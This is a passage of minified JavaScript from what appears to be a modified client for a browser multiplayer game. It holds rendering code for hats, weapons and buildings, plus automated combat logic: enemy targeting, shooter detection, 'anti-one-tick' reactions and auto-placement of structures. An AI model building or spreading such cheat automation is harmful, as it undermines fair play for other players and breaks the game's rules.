            // console.log(`${player.name}[${player.sid}] poisoned ${e.name}[${e.sid}]`)
        }
    })
}
/* Mr, Er (skinSprites, skinPointers)
   Pr, Cr (accessSprites, accessPointers)
   jn (toolSprites)
*/
function Ir(e, t, i, ez) {

    //console.log(J, spectator?.rPlayers);
    for (let s = 0, animALL = J.concat(WC); s < animALL.length; ++s) {
        let y = animALL[s];
        if(y) {
            if (y?.zIndex == i) {
                y.animate(be);
                if (y.fake) {
                    M.globalAlpha = y.vals && (y.vals = max(0, y.vals -= y.decay));
                } else {
                    M.globalAlpha = 1 ;
                }
                if ((y.visible || y.fake || y.spectate)) {
                    y.skinRot += 0.002 * be;
                    let lr = (y == E ? vs() : y.dir) + y.dirPlus;
                    M.save();
                    M.translate(y.x - e, y.y - t);
                    M.rotate(lr);
                    Bf(y, M);
                    M.restore();
                }
            }
        }
    }
}

function Q(e, t, i, s, n, r) {
    s = s || M;
    s.beginPath();
    s.arc(e, t, i, 0, PI2);
    r || s.fill();
    n || s.stroke();
}

function Bf(e, t) { // function for motion blur pretty sure this, function Ar, Bf, Ir, _o. thats it.
    t = t || M,
        t.lineWidth = Xe,
        t.lineJoin = "miter";


    const i = PI / 4 * (R.weapons[e.weaponIndex].armS || 1)
    , s = e.buildIndex < 0 && R.weapons[e.weaponIndex].hndS || 1
    , n = e.buildIndex < 0 && R.weapons[e.weaponIndex].hndD || 1;
    if (e.tailIndex > 0 && zf(e.tailIndex, t, e),
        e.buildIndex < 0 && !R.weapons[e.weaponIndex].aboveHand && (Ar(R.weapons[e.weaponIndex], T.weaponVariants[e.weaponVariant]?.src, e.scale, 0, t),
                                                                    R.weapons[e.weaponIndex].projectile != null && !R.weapons[e.weaponIndex].hideProjectile && Zn(e.scale, 0, R.projectiles[R.weapons[e.weaponIndex].projectile], M)),
        t.fillStyle = T.skinColors[e.skinColor],
        Q(e.scale * cos(i), e.scale * sin(i), 14),
        Q(e.scale * n * cos(-i * s), e.scale * n * sin(-i * s), 14),
        e.buildIndex < 0 && R.weapons[e.weaponIndex].aboveHand && (Ar(R.weapons[e.weaponIndex], T.weaponVariants[e.weaponVariant]?.src, e.scale, 0, t),
                                                                   R.weapons[e.weaponIndex].projectile != null && !R.weapons[e.weaponIndex].hideProjectile && Zn(e.scale, 0, R.projectiles[R.weapons[e.weaponIndex].projectile], M)),
        e.buildIndex >= 0) {
        const r = Ss(R.list[e.buildIndex]);
        t.drawImage(r, e.scale - R.list[e.buildIndex].holdOffset, -r.width / 2)
    }
    Q(0, 0, e.scale, t),
        e.skinIndex > 0 && (t.rotate(PI / 2),
                            _o(e.skinIndex, t, null, e));
  //  drawTarget(e,t)

}
const Mr = {}
, Er = {};
let De;
/*
// null = filler slots
// so apparently if you remove this, this means the recorder actually works again (as in the shop texture and alliance menu work again now, meaning the script will render lol).
function Ro(e, t, i, s) {
     if (!(De = Mr[t])) {
        var s = new Image();
        s.onload = function() {
            this.isLoaded = true;
            this.onload = null;

        // Change the source for hat 6 to your custom PNG
        switch (e) {
            case 6: r.src = "http://i.imgur.com/L6L0Q0l.png";
                break;
            case 7: r.src = "http://i.imgur.com/wqG2CBb.png";
                break;
            case 12: r.src = "https://i.imgur.com/VSUId2s.png";
                break;
            case 15: r.src = "https://i.imgur.com/YRQ8Ybq.png";
                break;
            case 26: r.src = "https://i.imgur.com/2PsUgEL.png";
                break;
            case 40: r.src = "https://i.imgur.com/lKGtlDF.png";
                break;
            default:
                r.src = "./img/hats/hat_" + e + ".png";
        }

        xr[e] = r;
        De = r;
    }

  var a = i || Er[t];
    if (!a) {
        for (var o = 0; o < Xt.length; ++o) {
            if (Xt[o].id == t) {
                a = Xt[o];
                break;
            }
        }
        Er[t] = a;
    }

  if (De.isLoaded) {
        var imageToDraw = gE('shadows')?.checked ? compositeImages.hats[t] : De;

        if (imageToDraw) {
            n.drawImage(imageToDraw, -a.scale / 2, -a.scale / 2, a.scale, a.scale);
        }

        if (!i && a.topSprite) {
            n.save();
            n.rotate(r.skinRot);
            _o(t + "_top", n, a, r);
            n.restore();
        }
    }
}
*/
function _o(t, n, i, r) {
 M.globalAlpha = .8;
    if (!(De = Mr[t])) {
        var s = new Image();
        s.onload = function() {
            this.isLoaded = true;
            this.onload = null;

            compositeImages.hats[t] = generateCompositeImage(1, this, a.scale);
        };
        s.src = ".././img/hats/hat_" + t + ".png";
        Mr[t] = s;
        De = s;
 M.globalAlpha = 0.6 ;
if (document.getElementById("visual").checked) {
    switch (t) {
        case 12:
            s.src = "https://i.imgur.com/VSUId2s.png";
            break;
        case 15:
            s.src = "https://i.imgur.com/YRQ8Ybq.png";
            break;
        case 26:
            s.src = "https://i.imgur.com/2PsUgEL.png";
            break;
        case 40:
            s.src = "https://i.imgur.com/pe3Yx3F.png";
            break;
        default:
            s.src = "./img/hats/hat_" + t + ".png";
    }
} else {
    // Default texture pack
    s.src = "./img/hats/hat_" + t + ".png";
}
    }
   

    var a = i || Er[t];
    if (!a) {
        for (var o = 0; o < Xt.length; ++o) {
            if (Xt[o].id == t) {
                a = Xt[o];
                break;
            }
        }
        Er[t] = a;
    }

    if (De.isLoaded) {
        var imageToDraw = gE('shadows')?.checked ? compositeImages.hats[t] : De;

        if (imageToDraw) {
            n.drawImage(imageToDraw, -a.scale / 2, -a.scale / 2, a.scale, a.scale);
        }

        if (!i && a.topSprite) {
            n.save();
            n.rotate(r.skinRot);
            _o(t + "_top", n, a, r);
            n.restore();
        }
    }
}



function drawCompositeImage(e, t, n, i, r, scale, type) {
    let imageCache = e[t];

    if (!imageCache) {
        const image = new Image();
        image.onload = function() {
            this.isLoaded = true;
            this.onload = null;

            e[t] = generateCompositeImage(type, this, scale);
        };
        image.src = i + t + r;
        imageCache = image;
    }

    const imageToDraw = gE('shadows')?.checked ? e[t] : imageCache;

    if (imageToDraw) {
        n.drawImage(imageToDraw, -r.scale / 2, -r.scale / 2, r.scale, r.scale);
    }

    if (!i && r.topSprite) {
        n.save();
        n.rotate(scale.skinRot);
        drawCompositeImage(e, t + "_top", n, i, r, scale, type);
        n.restore();
    }
}




function drawTarget(e, t){
    if(nearestenemy&&e.sid == nearestenemy?.sid&&pushing){
        t.strokeStyle = "#fff"
        t.fillStyle = "#fff"
        for(let i = 0;i < 4;i++){
            t.save();
            t.rotate(i*Math.PI/2+e.skinRot);
            t.beginPath();
            t.arc(0,0,35, -Math.PI/7, Math.PI/7);
            t.stroke();
            t.beginPath();
            t.moveTo(0, 25);
            t.lineTo(0, 40);
            t.stroke();
            t.restore();

        }
/*
        if(fastHypot(pushVector.x, pushVector.y) > 10){

            t.beginPath();
            t.moveTo(0, 0);
            t.lineTo(pushVector.x, pushVector.y);
            t.stroke();
        }*/
    }
}
const Pr = {}
, Cr = {};
function zf(e, t, i) {

    let s = Cr[e];
    if (!(De = Pr[e])) {
        var n = new Image();
        n.onload = function() {
            this.isLoaded = true;
            // Cache the composite image
            compositeImages.accessories[e] = generateCompositeImage("accessory",this, s.scale, s.scale, i.fake);
        };
        n.src = ".././img/accessories/access_" + e + ".png";
        Pr[e] = n;
        De = n;
    }

    if (!s) {
        for (let n = 0; n < Gt.length; ++n)
            if (Gt[n].id == e) {
                s = Gt[n];
                break
            }
        Cr[e] = s
    }
    if (De.isLoaded) {
        var compositeImage = De;
        if (compositeImage) {
            t.save();
            t.translate(-20 - (s.xOff || 0), 0);
            if (s.spin) {
                t.rotate(i.skinRot);
            }
            t.drawImage(compositeImage, -s.scale / 2, -s.scale / 2, s.scale, s.scale);
            t.restore();
        }
    }
}
var jn = {};
function Ar(e, t, n, i, r) {
    var s = e.src + (t || ""),
        a = jn[s];
    if (!a) {
        a = new Image();
        a.onload = function() {
            this.isLoaded = true;

            // Cache the composite image
            compositeImages.weapons[s] = generateCompositeImage('weapon',this, e.length, e.width);
        };
        a.src = ".././img/weapons/" + s + ".png";
        jn[s] = a;
    } else if(a && compositeImages.weapons[s]==undefined){
        a = new Image();
        a.onload = function() {
            this.isLoaded = true;

            // Cache the composite image
            compositeImages.weapons[s] = generateCompositeImage('weapon',this, e.length, e.width);
        };
        a.src = ".././img/weapons/" + s + ".png";
        jn[s] = a;
    }

    if (a.isLoaded) {
        var compositeImage = a;
        if (compositeImage) {
            // Draw the cached composite image onto the canvas
            r.drawImage(compositeImage, n + e.xOff - e.length / 2, i + e.yOff - e.width / 2, e.length, e.width);
        }
    }
}
const Dr = {};
function Hf(e) {

    const t = e.y >= T.mapScale - T.snowBiomeTop ? 2 : e.y <= T.snowBiomeTop ? 1 : 0
    , i = e.type + "_" + e.scale + "_" + t;

    let s = Dr[i];
    if (!s) {

        const r = document.createElement("canvas");
        r.width = r.height = e.scale * 2.1 + Xe;
        const o = r.getContext("2d");
        if (o.translate(r.width / 2, r.height / 2),
            o.rotate(C.randFloat(0, PI)),
            o.strokeStyle = ei,
            o.lineWidth = Xe,
            e.type == 0) {
            let l;
            for (var n = 0; n < 2; ++n){
                //  console.log(n)

                l = y.scale * (n ? .5 : 1),
                    Ie(o, y.sid % 2 === 0 ? 5 : 7, l, l * .7),
                    o.fillStyle = t ? n ? "#fff" : "#e3f1f4" : n ? "#b4db62" : "#9ebf57",
                    o.fill(),
                    n || o.stroke()
            }
        } else if (e.type == 1){
            if (t == 2)
                o.fillStyle = "#606060",
                    Ie(o, 6, e.scale * .3, e.scale * .71),
                    o.fill(),
                    o.stroke(),
                    o.fillStyle = "#89a54c",
                    Q(0, 0, e.scale * .55, o),
                    o.fillStyle = "#a5c65b",
                    Q(0, 0, e.scale * .3, o, !0);
            else {
                Uf(o, 6, y.scale, y.scale * .7),
                    o.fillStyle = t ? "#e3f1f4" : "#89a54c",
                    o.fill(),

                o.stroke(),
                    o.fillStyle = t ? "#6a64af" : "#c15555";
                let l;
                const c = 4
                , a = Ze / c;
                for (var n = 0; n < c; ++n)
                    l = C.randInt(y.scale / 3.5, y.scale / 2.3),
                        Q(l * cos(a * n), l * sin(a * n), C.randInt(10, 12), o)
            }
        }else{
            (e.type == 2 || e.type == 3)

            o.fillStyle = e.type == 2 ? t == 2 ? "#938d77" : "#939393" : "#e0c655",

                Ie(o, 3, e.scale, e.scale),
                o.fill(),
                o.stroke(),
                o.fillStyle = e.type == 2 ? t == 2 ? "#b2ab90" : "#bcbcbc" : "#ebdca3",

            Ie(o, 3, e.scale * .55, e.scale * .65),
                o.fill()

        }
        s = r,
            Dr[i] = s
    }
    return s
}
function Or(e, t, i) {
    const s = e.lineWidth || 0;
    i /= 2,
        e.beginPath();
    let n = PI2 / t;
    for (let r = 0; r < t; r++)
        e.lineTo(i + (i - s / 2) * cos(n * r), i + (i - s / 2) * sin(n * r));
    e.closePath()
}
function Ff() {
    const t = T.volcanoScale * 2
    , i = document.createElement("canvas");
    i.width = t,
        i.height = t;
    const s = i.getContext("2d");
    s.strokeStyle = "#3e3e3e",
        s.lineWidth = Xe * 2,
        s.fillStyle = "#7f7f7f",
        Or(s, 10, t),
        s.fill(),
        s.stroke(),
        Me.land = i;
    const n = document.createElement("canvas")
    , r = T.innerVolcanoScale * 2;
    n.width = r,
        n.height = r;
    const o = n.getContext("2d");
    o.strokeStyle = ei,
        o.lineWidth = Xe * 1.6,
        o.fillStyle = "#f54e16",
        o.strokeStyle = "#f56f16",
        Or(o, 10, r),
        o.fill(),
        o.stroke(),
        Me.lava = n
}
Ff();
const Rr = [];
function Ss(e, t, action, obj) {

    let i = Rr[e.id];

    if (!i || t && e.lastAnim) {
        const c = document.createElement("canvas");
        c.width = c.height = e.scale * 2.5 + Xe + (R.list[e.id].spritePadding || 0);
        const a = c.getContext("2d");
 

        if (a.translate(c.width / 2, c.height / 2),
            a.rotate(t ? 0 : PI / 2),
            a.strokeStyle = ei,
            a.lineWidth = Xe * (t ? c.width / 81 : 1),
            e.name == "apple") {
            a.fillStyle = "#c15555",
                Q(0, 0, e.scale, a),
                a.fillStyle = "#89a54c";
            const u = -(PI / 2);
            Vf(e.scale * cos(u), e.scale * sin(u), 25, u + PI / 2, a)
        } else if (e.name == "cookie") {
            a.fillStyle = "#cca861",
                Q(0, 0, e.scale, a),
                a.fillStyle = "#937c4b";
            for (var s = 4, n = Ze / s, r, o = 0; o < s; ++o)
                r = C.randInt(e.scale / 2.5, e.scale / 1.7),
                    Q(r * cos(n * o), r * sin(n * o), C.randInt(4, 5), a, !0)
        } else if (e.name == "cheese") {
            a.fillStyle = "#f4f3ac",
                Q(0, 0, e.scale, a),
                a.fillStyle = "#c3c28b";
            for (var s = 4, n = Ze / s, r, o = 0; o < s; ++o)
                r = C.randInt(e.scale / 2.5, e.scale / 1.7),
                    Q(r * cos(n * o), r * sin(n * o), C.randInt(4, 5), a, !0)
        } else if (e.name == "wood wall" || e.name == "stone wall" || e.name == "castle wall") {
            a.fillStyle = e.name == "castle wall" ? "#83898e" : e.name == "wood wall" ? "#a5974c" : "#939393";
            const u = e.name == "castle wall" ? 4 : 3;
            Ie(a, u, e.scale * 1.1, e.scale * 1.1),
                a.fill(),
                a.stroke(),
                a.fillStyle = e.name == "castle wall" ? "#9da4aa" : e.name == "wood wall" ? "#c9b758" : "#bcbcbc",
                Ie(a, u, e.scale * .65, e.scale * .65),
                a.fill()
        } else if (
            "spikes" == e.name ||
            "greater spikes" == e.name ||
            "poison spikes" == e.name ||
            "spinning spikes" == e.name
        ) {
            var u = 0.6 * e.scale;
            let p = M.createRadialGradient(0, 0, e.scale, 0, 0, u);
            p.addColorStop(0.6, "#9c91e5"),
                p.addColorStop(0.9, "#9c91e5"),
                (a.fillStyle = p),

                Ie(a, "spikes" == e.name ? 5 : 6, e.scale, u),
                a.fill(),
                a.stroke(),
                (a.fillStyle = "#a5974c"),
                Q(0, 0, u, a),
                (a.fillStyle = "#c9b758"),
                Q(0, 0, u / 2, a, !0);


            /*let val = e.name == "spikes" ? 8 : 8.5
            let val2 = e.name == "spikes" ? .6 : .65

            a.shadowBlur = shadows ? val: 0//8.5
            a.shadowColor = `rgba(0, 0, 0, ${val2})`
            a.fillStyle = e.name == "poison spikes" ? "#7b935d" : "#79A9CA";

            var l = e.scale * .6;
            //if(action || !gE("all visuals").checked){
            Ie(a, e.name == "spikes" ? 5 : 6, e.scale, l);
            a.fill();
            a.stroke();
            a.fillStyle = "#a5974c";
            (a.shadowBlur = 0, a.shadowColor = null);
            Q(0, 0, l, a);
            a.fillStyle = "#c9b758";
            Q(0, 0, l / 2, a, !0);
            //}*/
        } else if (e.name == "windmill" || e.name == "faster windmill" || e.name == "power mill")
            a.fillStyle = "#a5974c",
                Q(0, 0, e.scale, a),
                a.fillStyle = "#c9b758",
                En(0, 0, e.scale * 1.5, 29, 4, a),
                a.fillStyle = "#a5974c",
                Q(0, 0, e.scale * .5, a);
        else if (e.name == "mine")
            a.fillStyle = "#939393",
                Ie(a, 3, e.scale, e.scale),
                a.fill(),
                a.stroke(),
                a.fillStyle = "#bcbcbc",
                Ie(a, 3, e.scale * .55, e.scale * .65),
                a.fill();
        else if (e.name == "sapling")
            for (var o = 0; o < 2; ++o) {
                var l = e.scale * (o ? .5 : 1);
                Ie(a, 7, l, l * .7),
                    a.fillStyle = o ? "#b4db62" : "#9ebf57",
                    a.fill(),
                    o || a.stroke()
            }

        else if (e.name == "pit trap") {
a.globalAlpha = .7,
                (a.fillStyle = "#a5974c"),
                Ie(a, 3, 1.1 * e.scale, 1.1 * e.scale),
                a.fill(),
                a.stroke(),
                (a.fillStyle = ei),
                a.globalAlpha = .6,

                Ie(a, 3, 0.65 * e.scale, 0.65 * e.scale),
                a.fill();

        }  else if (e.name == "boost pad")
            a.fillStyle = "#7e7f82",
                kt(0, 0, e.scale * 2, e.scale * 2, a),
                a.fill(),
                a.stroke(),
                a.fillStyle = "#dbd97d",
                Lf(e.scale * 1, a);
        else if (e.name == "turret") {
            a.fillStyle = "#a5974c",
                Q(0, 0, e.scale, a),
                a.fill(),
                a.stroke(),
                a.fillStyle = "#939393";
            const u = 50;
            kt(0, -u / 2, e.scale * .9, u, a),
                Q(0, 0, e.scale * .6, a),
                a.fill(),
                a.stroke()
        } else if (e.name == "platform") {
            a.fillStyle = "#cebd5f";
            const u = 4
            , p = e.scale * 2
            , h = p / u;
            let m = -(e.scale / 2);
            for (var o = 0; o < u; ++o)
                kt(m - h / 2, 0, h, e.scale * 2, a),
                    a.fill(),
                    a.stroke(),
                    m += p / u
        } else
            e.name == "healing pad" ? (a.fillStyle = "#7e7f82",
                                       kt(0, 0, e.scale * 2, e.scale * 2, a),
                                       a.fill(),
                                       a.stroke(),
                                       a.fillStyle = "#db6e6e",
                                       En(0, 0, e.scale * .65, 20, 4, a, !0)) : e.name == "spawn pad" ? (a.fillStyle = "#7e7f82",
                                                                                                         kt(0, 0, e.scale * 2, e.scale * 2, a),
                                                                                                         a.fill(),
                                                                                                         a.stroke(),
                                                                                                         a.fillStyle = "#71aad6",
                                                                                                         Q(0, 0, e.scale * .6, a)) : e.name == "blocker" ? (a.fillStyle = "#7e7f82",
            Q(0, 0, e.scale, a),
            a.fill(),
            a.stroke(),
            a.rotate(PI / 4),
            a.fillStyle = "#db6e6e",
            En(0, 0, e.scale * .65, 20, 4, a, !0)) : e.name == "teleporter" && (a.fillStyle = "#7e7f82",
                                                                                Q(0, 0, e.scale, a),
                                                                                a.fill(),
                                                                                a.stroke(),
                                                                                a.rotate(PI / 4),
                                                                                a.fillStyle = "#d76edb",
                                                                                Q(0, 0, e.scale * .5, a, !0));
        i = c,
            t || (Rr[e.id] = i)
    }
e.lastAnim

    return i
}
function Ss1(e, t, action, obj) {
    let shadow = 0;
    let i = Rr[e.id];

    if (!i || t) {
        const c = document.createElement("canvas");
        c.width = c.height = e.scale * 2.5 + Xe + (R.list[e.id].spritePadding || 0);
        const a = c.getContext("2d");
    
        if (a.translate(c.width / 2, c.height / 2),
            a.rotate(t ? 0 : PI / 2),
            a.strokeStyle = ei,
            a.lineWidth = Xe * (t ? c.width / 81 : 1),
            e.name == "apple") {
            a.fillStyle = "#c15555",
                Q(0, 0, e.scale, a),
                a.fillStyle = "#89a54c";
            const u = -(PI / 2);
            Vf(e.scale * cos(u), e.scale * sin(u), 25, u + PI / 2, a)
        } else if (e.name == "cookie") {
            a.fillStyle = "#cca861",
                Q(0, 0, e.scale, a),
                a.fillStyle = "#937c4b";
            for (var s = 4, n = Ze / s, r, o = 0; o < s; ++o)
                r = C.randInt(e.scale / 2.5, e.scale / 1.7),
                    Q(r * cos(n * o), r * sin(n * o), C.randInt(4, 5), a, !0)
        } else if (e.name == "cheese") {
            a.fillStyle = "#f4f3ac",
                Q(0, 0, e.scale, a),
                a.fillStyle = "#c3c28b";
            for (var s = 4, n = Ze / s, r, o = 0; o < s; ++o)
                r = C.randInt(e.scale / 2.5, e.scale / 1.7),
                    Q(r * cos(n * o), r * sin(n * o), C.randInt(4, 5), a, !0)
        } else if (e.name == "wood wall" || e.name == "stone wall" || e.name == "castle wall") {
            a.fillStyle = e.name == "castle wall" ? "#83898e" : e.name == "wood wall" ? "#a5974c" : "#939393";
            const u = e.name == "castle wall" ? 4 : 3;
            Ie(a, u, e.scale * 1.1, e.scale * 1.1),
                a.fill(),
                a.stroke(),
                a.fillStyle = e.name == "castle wall" ? "#9da4aa" : e.name == "wood wall" ? "#c9b758" : "#bcbcbc",
                Ie(a, u, e.scale * .65, e.scale * .65),
                a.fill()
        } else if (e.name == "spikes" || e.name == "greater spikes" || e.name == "poison spikes" || e.name == "spinning spikes") {
            let val = e.name == "spikes" ? 8 : 8.5
            let val2 = e.name == "spikes" ? .6 : .65

            a.fillStyle = e.name == "poison spikes" ? "#7b935d" : "#79A9CA";
            var l = e.scale * .6;
            if(action || (!obj?.fake)){
                Ie(a, e.name == "spikes" ? 5 : 6, e.scale, l);
                a.fill();
                a.stroke();
                a.fillStyle = "#a5974c";
                Q(0, 0, l, a);
                a.fillStyle = "#c9b758";
                Q(0, 0, l / 2, a, !0);
            } else if(obj?.fake) {

                    Ie(a, e.name == "spikes" ? 5 : 6, e.scale, l);
                a.stroke();
         
                if(!obj?.fake){
                    a.beginPath();
                    a.arc(0, 0, l, 0, PI2);
                    a.stroke();
                }
            }

        } else if (e.name == "windmill" || e.name == "faster windmill" || e.name == "power mill")
            a.fillStyle = "#a5974c",
                Q(0, 0, e.scale, a),
                a.fillStyle = "#c9b758",
                En(0, 0, e.scale * 1.5, 29, 4, a),
                a.fillStyle = "#a5974c",
                Q(0, 0, e.scale * .5, a);
        else if (e.name == "mine")
            a.fillStyle = "#939393",
                Ie(a, 3, e.scale, e.scale),
                a.fill(),
                a.stroke(),
                a.fillStyle = "#bcbcbc",
                Ie(a, 3, e.scale * .55, e.scale * .65),
                a.fill();
        else if (e.name == "sapling")
            for (var o = 0; o < 2; ++o) {
                var l = e.scale * (o ? .5 : 1);
                Ie(a, 7, l, l * .7),
                    a.fillStyle = o ? "#b4db62" : "#9ebf57",
                    a.fill(),
                    o || a.stroke()
            }
      else if (e.name == "pit trap") {
a.shadowBlur =  0;
            a.fillStyle = "#a5974c",
                Ie(a, 3, e.scale * 1.1, e.scale * 1.1),
                a.fill(),
                a.stroke(),
               a.fillStyle = ei,
                Ie(a, 3, e.scale * .65, e.scale * .65),
                a.fill();
        } else if (e.name == "boost pad")
            a.fillStyle = "#7e7f82",
                kt(0, 0, e.scale * 2, e.scale * 2, a),
                a.fill(),
                a.stroke(),
                a.fillStyle = "#dbd97d",
                Lf(e.scale * 1, a);
        else if (e.name == "turret") {
            a.fillStyle = "#a5974c",
                Q(0, 0, e.scale, a),
                a.fill(),
                a.stroke(),
                a.fillStyle = "#939393";
            const u = 50;
            kt(0, -u / 2, e.scale * .9, u, a),
                Q(0, 0, e.scale * .6, a),
                a.fill(),
                a.stroke()
        } else if (e.name == "platform") {
            a.fillStyle = "#cebd5f";
            const u = 4
            , p = e.scale * 2
            , h = p / u;
            let m = -(e.scale / 2);
            for (var o = 0; o < u; ++o)
                kt(m - h / 2, 0, h, e.scale * 2, a),
                    a.fill(),
                    a.stroke(),
                    m += p / u
        } else
            e.name == "healing pad" ? (a.fillStyle = "#7e7f82",
                                       kt(0, 0, e.scale * 2, e.scale * 2, a),
                                       a.fill(),
                                       a.stroke(),
                                       a.fillStyle = "#db6e6e",
                                       En(0, 0, e.scale * .65, 20, 4, a, !0)) : e.name == "spawn pad" ? (a.fillStyle = "#7e7f82",
                                                                                                         kt(0, 0, e.scale * 2, e.scale * 2, a),
                                                                                                         a.fill(),
                                                                                                         a.stroke(),
                                                                                                         a.fillStyle = "#71aad6",
                                                                                                         Q(0, 0, e.scale * .6, a)) : e.name == "blocker" ? (a.fillStyle = "#7e7f82",
            Q(0, 0, e.scale, a),
            a.fill(),
            a.stroke(),
            a.rotate(PI / 4),
            a.fillStyle = "#db6e6e",
            En(0, 0, e.scale * .65, 20, 4, a, !0)) : e.name == "teleporter" && (a.fillStyle = "#7e7f82",
                                                                                Q(0, 0, e.scale, a),
                                                                                a.fill(),
                                                                                a.stroke(),
                                                                                a.rotate(PI / 4),
                                                                                a.fillStyle = "#d76edb",
                                                                                Q(0, 0, e.scale * .5, a, !0));
        i = c,
            t || (Rr[e.id] = i)
    }
 
    return i
}
function Vf(e, t, i, s, n) {
    const r = e + i * cos(s)
    , o = t + i * sin(s)
    , l = i * .4;
    n.moveTo(e, t),
        n.beginPath(),
        n.quadraticCurveTo((e + r) / 2 + l * cos(s + PI / 2), (t + o) / 2 + l * sin(s + PI / 2), r, o),
        n.quadraticCurveTo((e + r) / 2 - l * cos(s + PI / 2), (t + o) / 2 - l * sin(s + PI / 2), e, t),
        n.closePath(),
        n.fill(),
        n.stroke()
}
function Q(e, t, i, s, n, r) {
    s = s || M,
        s.beginPath(),
        s.arc(e, t, i, 0, PI2),
        r || s.fill(),
        n || s.stroke()
}
function Ie(e, t, i, s) {
    let n = PI / 2 * 3, r, o;
    const l = PI / t;
    e.beginPath(),
        e.moveTo(0, -i-.0000250)//-2.1); // removes the dumb building triangle on edge bug
    for (let c = 0; c < t; c++)
        r = cos(n) * i,
            o = sin(n) * i,
            e.lineTo(r, o),
            n += l,
            r = cos(n) * s,
            o = sin(n) * s,
            e.lineTo(r, o),
            n += l;
    e.lineTo(0, -i),
        e.closePath()
}
function kt(e, t, i, s, n, r) {
    n.fillRect(e - i / 2, t - s / 2, i, s),
        r || n.strokeRect(e - i / 2, t - s / 2, i, s)
}
function En(e, t, i, s, n, r, o) {
    r.save(),
        r.translate(e, t),
        n = ceil(n / 2);
    for (let l = 0; l < n; l++)
        kt(0, 0, i * 2, s, r, o),
            r.rotate(PI / n);
    r.restore()
}
function Uf(e, t, i, s) {
    let n = PI / 2 * 3;
    const r = PI / t;
    let o;
    e.beginPath(),
        e.moveTo(0, -s);
    for (let l = 0; l < t; l++)
        o = C.randInt(i + .9, i * 1.2),
            e.quadraticCurveTo(cos(n + r) * o, sin(n + r) * o, cos(n + r * 2) * s, sin(n + r * 2) * s),
            n += r * 2;
    e.lineTo(0, -s),
        e.closePath()
}
function Lf(e, t) {
    t = t || M;
    const i = e * (sqrt(3) / 2);
    t.beginPath(),
        t.moveTo(0, -i / 2),
        t.lineTo(-e / 2, i / 2),
        t.lineTo(e / 2, i / 2),
        t.lineTo(0, -i / 2),
        t.fill(),
        t.closePath()
}
function Nf() {
    const e = T.mapScale / 2;
    ue.add(0, e, e + 200, 0, T.treeScales[3], 0),
        ue.add(1, e, e - 480, 0, T.treeScales[3], 0),
        ue.add(2, e + 300, e + 450, 0, T.treeScales[3], 0),

        ue.add(7, e - 260, e + 340, 0, T.bushScales[3], 1),
        ue.add(8, e + 760, e + 310, 0, T.bushScales[3], 1),
        ue.add(9, e - 800, e + 100, 0, T.bushScales[3], 1)



}
function loadObject(e, playr) {
    // console.log(Date.now()-time)
    for (var i = 0; i < e.length; i += 8) {
        ue.add(...e.slice(i, i + 6), R.list[e[i + 6]], true, (e[i + 7] >= 0 ? { sid: e[i + 7] } : null));
        playr = findPlayerSID(e[i+7])
        if(e[i+7]!==null&&playr!=null&&inRender(E,playr)){
            onioncheckestoo(findPlayerSID(e[i+7]).loadout, e[i+6])
        }
    }
}
async function objectHit(e, t) {
    await nextTick();
    if (y = findBuildingBySID(t)) {
        y.xWiggle += T.gatherWiggle * cos(e);
        y.yWiggle += T.gatherWiggle * sin(e);
        //y.wiggleDirs.push(e);
        //thisTick.objectsWiggled.push(y);
        y.tick = tick;
        hitList.push(new resolveHit(e, y));
        y.lastHealth = y.health;
        y.animatedHealth = Date.now();
        /*serverconnected && socketer.send(JSONStringify({
            msg:"sendWiggleData",
            sender: E?.sid, // add + 1 for testing purposes
            sendX: E?.x2,
            sendY: E?.y2,
            build: t,
            wiggleDir: e,
            time: Date.now(),
            server: location.href
        }));*/
    }
}
function turretShot(e, t) {
    if (y = findBuildingBySID(e)) {
        y.dir = t;
        y.xWiggle += T.gatherWiggle * cos(t + PI);
        y.yWiggle += T.gatherWiggle * sin(t + PI);
    }
}
function addProjectile(e, t, i, s, n, r, o, l,ws) {
    ds && (po.addProjectile(e, t, i, s, n, r, null, null, o).sid = l)
    if(!ws){
        projectileDetection(e,t,i,s,n,r);
        //projs.push({x:e,y:t,ang:i,range:s,speed:n,type:r,travel:0,owner:null,turret:null})
    }
}

function onPlatform(_, objs){
    objs = renderObjects.filter(x => x.name == "platform")
    if(!objs.length) return 0;
    for(let i = 0; i < objs.length; i++){
        if(dist2(objs[i],_) <= 35 + objs[i].scale){
            return 1
        }
    }
    return 0;
}
async function projectileDetection(e, t, n, i, r,s,bot,bool,get,_){
    if(bot&&!bool&&!get) return bot.updater.push({id: projectileDetection, data: [e, t, n, i,r,s,bot,true]});
    if(!bot&&!bool&&!get) return updater.push({id: projectileDetection, data: [e, t, n, i,r,s,false,true]});
    if(s==1){
        let ez = findTurret(e,t)
        if(get&&ez)return ez
        if(ez) return;
    }
    //console.log(e, t, n, i, r);
    // x, y, angle, range, speed, projectile type
    let min = Infinity;
    let id = -1;
    let player = null;
    let newXY = calcPoint(e, t, n + PI, 70)
    for(let i=0;i<J.length;i++){
        _ = J[i];
        if(r == 1.5 && s == 1){
            if(_.visible&&_.skinIndex==53&&dist({x:e,y:t},_)<=2){
                player = _
                break;
            }
        }
        if(!(r==1.5&&s==1)){
            if(_.visible && _?.weaponIndex == _?.secondary&& _.d2 === n && R.weapons[_.weaponIndex].projectile == s &&dist2(newXY,_)<=20){
                player = _
                break;
            }
        }
    }
 
    if(get) return player
  
    if(player){
        projs.push({x: player.x2, y: player.y2, dir: n, spd: r * (player.skinIndex === 1 ? 1.3 : 1), avoid: r == 1.5 || onPlatform(player) ? 1 : 0, max: R.projectiles[s].range, dmg: R.projectiles[s].dmg, traveled: 0, owner: player, building: null, hit: null, info: R.projectiles[s]});
        let findPlayer = whoShot.find(x=> x.player.sid === player.sid)
        if(!findPlayer){
            whoShot.push({player:player,projs:[s],amt:1,tick:tick})
        } else {
            if(!findPlayer.projs.includes(s)) findPlayer.amt++;
            findPlayer.projs.push(s)
            findPlayer.tick = tick
        }
    }

    if(r == 1.5 &&s == 1 && player){
        if (primaryReloads[player.sid] === 1 &&!clan(player.sid) &&dist(player, E) <= 300 &&(player.primary === 5 &&player.primaryVar >= 2 || player.primary === undefined)) {
            antiOneTick = 1;
            // recently added, uncomment if needed
            antiOneTicks();
        }
        player.tr = 0;
    }
    if((r!=1.5&& s!=1) && player){
        player.skinIndex == 20 ? (player.samRS = .78) : (player.samRS = 1)
        player.sr=0;
    }

    if(player&& !clan(player.sid)){
        let direction = getAimer({x:e,y:t},E)
        let direction2 = getAimer(E,{x:e,y:t})
        let findPlayer = whoShot.find(x => x.player?.sid == player.sid)
        if(dAng(n,direction)<.6 && findPlayer?.amt >= 3){
            place(millType,direction2);
